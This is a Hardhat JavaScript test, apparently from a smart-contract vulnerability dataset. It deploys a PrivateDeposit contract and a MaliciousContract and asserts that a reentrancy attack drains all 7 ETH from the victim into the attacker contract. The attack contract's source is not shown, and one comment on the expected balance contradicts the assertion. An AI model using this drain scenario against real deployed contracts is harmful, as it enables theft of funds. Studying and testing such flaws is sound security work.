const { expect } = require("chai");
const { ethers } = require("hardhat");
describe("Reentrancy Attack for 0x7a8721a9d64c74da899424c1b52acbf58ddc9782.sol", function () {
  let PrivateDeposit;
  let privateDeposit;
  let MaliciousContract;
  let maliciousContract;
  let Log;
  let log;

  beforeEach(async function () {
    // Deploy Log contract
    Log = await ethers.getContractFactory("contracts/dataset/reentrancy/0x7a8721a9d64c74da899424c1b52acbf58ddc9782.sol:Log");
    log = await Log.deploy();
    await log.waitForDeployment();

    // Deploy PrivateDeposit contract with Log address
    PrivateDeposit = await ethers.getContractFactory("contracts/dataset/reentrancy/0x7a8721a9d64c74da899424c1b52acbf58ddc9782.sol:PrivateDeposit");
    privateDeposit = await PrivateDeposit.deploy();
    await privateDeposit.waitForDeployment();
    await privateDeposit.setLog(log.target); // Set Log address after deployment

    // Deploy MaliciousContract with PrivateDeposit address
    MaliciousContract = await ethers.getContractFactory("contracts/reentrancy/0x7a8721a9d64c74da899424c1b52acbf58ddc9782_attack.sol:MaliciousContract");
    maliciousContract = await MaliciousContract.deploy(privateDeposit.target);
  });

  it("should successfully drain funds through reentrancy attack", async function () {
    // Initial deposit to PrivateDeposit contract
    await privateDeposit.Deposit({ value: ethers.parseEther("5") });

    const victimInitialBalance = await ethers.provider.getBalance(privateDeposit.target);
    expect(victimInitialBalance).to.equal(ethers.parseEther("5")); 


    // Initial deposit from maliciousCOntract on Personal Bank
    await maliciousContract.deposit({value:  ethers.parseEther("2")});

    const victimBalanceAfterDeposit = await ethers.provider.getBalance(privateDeposit.target);
    expect(victimBalanceAfterDeposit).to.equal(ethers.parseEther("7")); 


    // Perform reentrancy attack through MaliciousContract
    await maliciousContract.attack();
    
    // Check balances after attack
    const victimBalance = await ethers.provider.getBalance(privateDeposit.target);
    const maliciousContractBalance = await ethers.provider.getBalance(maliciousContract.target);

    // Verify the attack was successful
    
    // privateDeposit has a drained account
    expect(victimBalance).to.equal(ethers.parseEther("0")); 

    // 2 original balance + 1 from initial deposit 
    expect(maliciousContractBalance).to.equal(ethers.parseEther("7"));
    
  });
});
